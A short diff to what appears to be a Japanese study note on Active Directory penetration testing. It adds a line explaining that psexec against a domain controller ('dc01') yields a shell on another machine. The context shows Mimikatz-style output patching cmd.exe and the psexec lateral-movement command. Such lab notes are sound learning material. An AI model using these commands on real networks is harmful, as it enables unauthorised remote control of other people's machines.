@@ -333,3 +333,5 @@ Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 012E3A24
 C:¥Users¥offsec.crop> psexec.exe ¥¥dc01 cmd.exe
 PsExec v2.2 - Execute processes remotely Copyright (C) 2001-2016 Mark Russinovich Sysinternals - www.sysinternals.com C:¥Windows¥system32> 
 ```
+
+この*dc01*というのは、PowerViewの`Get-NetComputer`で表示されるような、他のマシンのこと。だから他のマシンのシェルを操作できるってこと！
